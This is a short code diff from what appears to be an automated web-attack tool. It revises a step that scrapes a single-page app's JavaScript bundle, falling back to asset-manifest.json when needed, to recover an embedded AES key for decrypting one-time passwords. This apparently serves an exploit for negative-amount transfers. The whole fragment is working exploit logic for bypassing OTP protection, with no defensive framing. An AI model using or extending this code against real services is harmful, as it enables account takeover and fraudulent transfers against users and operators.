@@ -610,9 +610,17 @@ async function sweepNegativeTransfer(
   const spaOrigin = scopeOrigins.find((o) => o !== new URL(signupUrl).origin) ?? null;
   if (!spaOrigin) { dbg("no SPA origin in scope to recover the OTP key — abort"); return proved; }
   const idx = await fire("GET", spaOrigin + "/", {}, null, null);
-  const chunk = /\/static\/js\/main\.[a-f0-9]+\.chunk\.js/.exec(idx?.response.body ?? "")?.[0];
-  if (!chunk) { dbg("could not locate main chunk in SPA index — abort"); return proved; }
-  const js = await fire("GET", spaOrigin + chunk, {}, null, null);
+  dbg(`SPA index: status=${idx?.response.status} len=${(idx?.response.body ?? "").length}`);
+  let chunk = /\/static\/js\/main\.[a-z0-9]+\.(?:chunk\.)?js/i.exec(idx?.response.body ?? "")?.[0] ?? null;
+  if (!chunk) {
+    // Fallback: CRA's asset-manifest.json maps "main.js" -> the hashed chunk path.
+    const man = await fire("GET", spaOrigin + "/asset-manifest.json", {}, null, null);
+    try { chunk = JSON.parse(man?.response.body ?? "{}").files?.["main.js"] ?? null; } catch { /* */ }
+    dbg(`asset-manifest fallback: chunk=${chunk}`);
+  }
+  if (!chunk) { dbg("could not locate main chunk (index + asset-manifest) — abort"); return proved; }
+  const chunkUrl = chunk.startsWith("http") ? chunk : spaOrigin + chunk;
+  const js = await fire("GET", chunkUrl, {}, null, null);
   const aes = parseAesCbcParams(js?.response.body ?? "");
   if (!aes) { dbg("could not recover AES params from bundle — abort"); return proved; }
   const decOtp = (b64: string): string | null => {
